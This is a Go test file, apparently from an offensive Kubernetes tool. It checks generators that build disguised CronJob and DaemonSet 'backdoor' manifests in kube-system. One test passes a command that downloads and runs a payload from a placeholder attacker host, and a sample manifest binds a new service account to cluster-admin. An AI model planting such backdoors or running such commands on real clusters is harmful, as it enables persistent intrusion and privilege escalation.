package kubectl

import (
	"testing"

	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
)

func TestDecodeYAMLDocuments(t *testing.T) {
	yamlContent := `apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-user
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-bind
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-user
  namespace: kube-system
`

	objects, err := decodeYAMLDocuments(yamlContent)
	if err != nil {
		t.Fatalf("expected multi-doc yaml to decode, got error: %v", err)
	}
	if len(objects) != 2 {
		t.Fatalf("expected 2 objects, got %d", len(objects))
	}
	if got := objects[0].GetKind(); got != "ServiceAccount" {
		t.Fatalf("expected first object ServiceAccount, got %q", got)
	}
	if got := objects[1].GetKind(); got != "ClusterRoleBinding" {
		t.Fatalf("expected second object ClusterRoleBinding, got %q", got)
	}
}

func TestBuildCronJobBackdoorYAMLHandlesQuotedCommands(t *testing.T) {
	yamlContent, err := BuildCronJobBackdoorYAML(
		"system-monitor",
		"kube-system",
		"alpine",
		"*/10 * * * *",
		`sh -c "wget -q http://LHOST/payload -O /tmp/p && sh /tmp/p"`,
	)
	if err != nil {
		t.Fatalf("expected cronjob yaml, got error: %v", err)
	}

	objects, err := decodeYAMLDocuments(yamlContent)
	if err != nil {
		t.Fatalf("expected generated cronjob yaml to decode, got error: %v", err)
	}
	if len(objects) != 1 {
		t.Fatalf("expected 1 object, got %d", len(objects))
	}
	rawContainers, found, err := unstructured.NestedSlice(objects[0].Object, "spec", "jobTemplate", "spec", "template", "spec", "containers")
	if err != nil || !found || len(rawContainers) != 1 {
		t.Fatalf("expected one container, found=%v err=%v len=%d", found, err, len(rawContainers))
	}
	container, ok := rawContainers[0].(map[string]interface{})
	if !ok {
		t.Fatalf("expected container map, got %T", rawContainers[0])
	}
	gotArgs, found, err := unstructured.NestedStringSlice(container, "args")
	if err != nil || !found {
		t.Fatalf("expected args, found=%v err=%v", found, err)
	}
	if len(gotArgs) != 2 || gotArgs[1] != `sh -c "wget -q http://LHOST/payload -O /tmp/p && sh /tmp/p"` {
		t.Fatalf("unexpected cronjob args: %#v", gotArgs)
	}
}

func TestBuildDaemonSetBackdoorYAMLHandlesQuotedCommands(t *testing.T) {
	yamlContent, err := BuildDaemonSetBackdoorYAML(
		"node-exporter",
		"kube-system",
		"alpine",
		"/host",
		`sh -c "echo [ok] && sleep 1"`,
	)
	if err != nil {
		t.Fatalf("expected daemonset yaml, got error: %v", err)
	}

	objects, err := decodeYAMLDocuments(yamlContent)
	if err != nil {
		t.Fatalf("expected generated daemonset yaml to decode, got error: %v", err)
	}
	if len(objects) != 1 {
		t.Fatalf("expected 1 object, got %d", len(objects))
	}
	rawContainers, found, err := unstructured.NestedSlice(objects[0].Object, "spec", "template", "spec", "containers")
	if err != nil || !found || len(rawContainers) != 1 {
		t.Fatalf("expected one container, found=%v err=%v len=%d", found, err, len(rawContainers))
	}
	container, ok := rawContainers[0].(map[string]interface{})
	if !ok {
		t.Fatalf("expected container map, got %T", rawContainers[0])
	}
	gotArgs, found, err := unstructured.NestedStringSlice(container, "args")
	if err != nil || !found {
		t.Fatalf("expected args, found=%v err=%v", found, err)
	}
	if len(gotArgs) != 2 || gotArgs[1] != `sh -c "echo [ok] && sleep 1"` {
		t.Fatalf("unexpected daemonset args: %#v", gotArgs)
	}
}
